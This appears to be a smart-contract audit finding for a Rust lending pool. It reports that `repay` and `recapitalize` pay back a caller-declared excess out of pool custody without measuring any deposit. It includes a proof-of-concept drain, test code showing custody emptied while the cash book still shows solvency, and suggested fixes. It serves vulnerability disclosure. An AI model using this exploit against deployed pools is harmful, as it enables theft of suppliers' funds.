### Title
Pool `repay` / `recapitalize` refund the *declared* excess out of real custody without ever measuring the inbound transfer, leaving the `cash` book overstating custody (File: contracts/pool/src/ops/repay.rs)

### Summary
The analog to "a refunded deposit remains in the payout set" is a refund leg whose size is derived from a caller-declared amount rather than from a measured inbound receipt. Both pool legs that compute a refund — `ops::repay::apply` (excess over outstanding debt) and `ops::recapitalize::apply` (excess over the backing shortfall) — book only the *applied* portion to `cash` but `transfer_out` the *declared* excess to `payer`. The refund is paid from live pool custody while the cash book is untouched, so a single unprivileged call can convert supplier collateral into a "refund", and the market then reports itself solvent while unable to pay withdrawals.

### Finding Description
In `contracts/pool/src/ops/repay.rs:25-67`, `apply` calls `accounting`, which resolves `action.amount` against the position's debt via `cache.resolve_repay(amount, position)` (`repay.rs:44`). The excess is computed as `overpayment = amount - net_repay`, `net_repay` is credited to cash (`repay.rs:57`), and then `apply` executes `outcome.cache.transfer_out(payer, outcome.overpayment)` (`repay.rs:32`). The doc comment states "The controller transfers the repay amount into the pool before this call" (`repay.rs:3`) — the pool itself never measures that receipt; it trusts the declared `action.amount`.

The identical shape exists in `contracts/pool/src/ops/recapitalize.rs:26-67`: `applied = amount.min(backing_shortfall)`, `refund = amount - applied`, `cache.credit_cash(applied)`, then `transfer_out(&payer, outcome.refund)` (`recapitalize.rs:34`). `require_nonneg_amount` (`recapitalize.rs:49`) is the only input check — there is no balance-delta measurement of the inbound leg.

The pool's own test suite pins the behavior and its consequence. `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` (`contracts/pool/tests/flows.rs:3590-3611`) repays a declared `custody_before` against a market with zero debt: `current_debt_ceil` is zero, `resolve_repay` takes the full-close branch, `net_repay == 0` satisfies the `RepayRoundsToZeroShares` disjunct (`repay.rs:48-52`), and the entire declared amount is refunded from real custody — `assert_unfunded_refund_drained_custody` (`flows.rs:3378-3401`) shows the payer received `declared` in full, pool custody is 0, and `cash` is unchanged.

`test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` (`flows.rs:3408-3483`) then proves the downstream impact: after draining custody via the refund, `Cache::require_reserves` still reads the untouched `cash` book, admits a supplier's `withdraw`, and the exit reverts inside the SAC `transfer` with `BalanceError = 10` — the market reports itself solvent and cannot pay.

### Impact Explanation
- Theft of user funds: a caller can name itself `payer`, declare `amount` equal to (or bounded by, per `flows.rs:3489-3511`, live custody), and receive a "refund" of tokens it never deposited. On a debt-free or low-debt market, `repay` alone suffices; `recapitalize` works whenever the backing shortfall is smaller than `amount` — which is always, since the refund exists precisely when `amount > applied`.
- Permanent freezing of funds / insolvency: even absent deliberate theft, `cash` overstates custody after any such refund, so subsequent legitimate withdrawals pass `require_reserves` and then revert in the token transfer — the contract is unable to operate from lack of token funds.

### Likelihood Explanation
The refund path is reachable on every repay and recapitalize leg; the triggering condition (declared amount exceeding applied amount) requires only that the caller declare more than the debt/shortfall. The repo's own tests demonstrate the drain succeeds end-to-end with no inbound transfer at all (`flows.rs:3603-3610`). Caveat I could not fully verify within the iteration budget: whether the pool entrypoints authenticate the controller as the sole caller. The test harness invokes `client().repay(&payer, ...)` and `client().recapitalize(...)` directly and they succeed, and the rules explicitly allow `recapitalize` as an unprivileged controller entrypoint plus direct token transfers to the pool — but if production pool entrypoints hard-require the controller, reachability then depends on whether the controller measures the inbound delta and passes the *measured* (not declared) amount to the pool, which I did not confirm in `contracts/controller/src/markets.rs`.

### Recommendation
Make the refund leg measured, not declared:
- In both `repay` and `recapitalize`, snapshot the pool's balance of `asset` before the leg (or accept the measured delta from the caller path) and cap `overpayment`/`refund` at the actual balance increase, so a "refund" can never exceed tokens that demonstrably arrived in this call.
- Alternatively, debit `cash` for the outbound refund or route the refund through `require_reserves`, so the book and custody cannot diverge.
- Apply the same measured-receipt rule to any future leg that returns an "excess" to `payer` (the pattern in `transfer_amount_measured` / `balance_delta_since` used by the controller in `contracts/controller/src/payments.rs:41-52` is the correct shape).

### Proof of Concept
Follows `contracts/pool/tests/flows.rs:3589-3611` verbatim:

```rust
// Market has custody C of `asset` and zero outstanding debt.
let payer = attacker; // unprivileged address, zero balance of `asset`
let custody = token::Client::new(&env, &asset).balance(&pool);

// No tokens are transferred in. Declare a repay of `custody`.
pool_client.repay(&payer, &vec![&env, RepayAction { position: empty, amount: custody }]);
// resolve_repay: current_debt_ceil == 0 -> full-close branch -> net_repay == 0,
// overpayment == custody -> transfer_out(payer, custody).

assert_eq!(token.balance(&pool), 0);      // custody drained
assert_eq!(token.balance(&payer), custody); // attacker holds it
assert_eq!(state.cash, before.cash);      // book still claims solvency

// A legitimate supplier's withdraw now passes require_reserves (book says funds
// exist) and reverts inside the SAC transfer with BalanceError = 10.
pool_client.try_withdraw(&supplier, &false, &withdraw_all) // -> Err(BalanceError)
```

The `recapitalize` variant is identical: `pool_client.recapitalize(&hub_asset, &payer, &custody)` with no inbound transfer pays `custody - applied` to `payer` out of supplier funds (`flows.rs:3408-3433`). [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

```rust
    payer: &Address,

}

/// Accrues interest, resolves the repay amount into burned debt shares and
/// overpayment, burns the shares, and credits the net repay to cash without
/// transferring the overpayment refund. Panics if a positive net repay would
/// burn zero scaled shares.
pub(crate) fn accounting(env: &Env, action: &PoolAction) -> RepayOutcome {
    let (mut cache, position) = ops::load_leg(env, action);
    let amount = action.amount;

    let (burned, overpayment) = cache.resolve_repay(amount, position);
    let net_repay = amount
        .checked_sub(overpayment)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));
    assert_with_error!(
        env,
        net_repay == 0 || burned.raw() > 0,
        GenericError::RepayRoundsToZeroShares
    );
```

```rust
pub(crate) fn apply(
    env: &Env,
    hub_asset: HubAssetKey,
    payer: Address,
    amount: i128,
) -> PoolAmountMutation {
    let outcome = accounting(env, hub_asset, amount);

    outcome.cache.transfer_out(&payer, outcome.refund);

    events::emit_market_state(env, outcome.cache.snapshot());
    outcome.mutation
}

/// Sizes and books the cash injection without transferring tokens.
///
/// Credits `min(amount, backing_shortfall)` to cash and commits. `refund` is
/// `amount - applied`.
pub(crate) fn accounting(
    env: &Env,
    hub_asset: HubAssetKey,
    amount: i128,
) -> RecapitalizationOutcome {
    require_nonneg_amount(env, amount);
    let mut cache = ops::renewed_market(env, &hub_asset);

    let applied = amount.min(guards::backing_shortfall(&cache));
    let refund = amount
        .checked_sub(applied)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));

    cache.credit_cash(applied);
    cache.commit();
```

```rust
/// After an unfunded refund, `cash` overstates custody. `Cache::require_reserves`
/// reads the book, not the balance, so it admits exits that then fail inside
/// the SAC transfer. The market reports itself solvent and cannot pay.
#[test]
fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
    );
}
```

```rust
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}
```
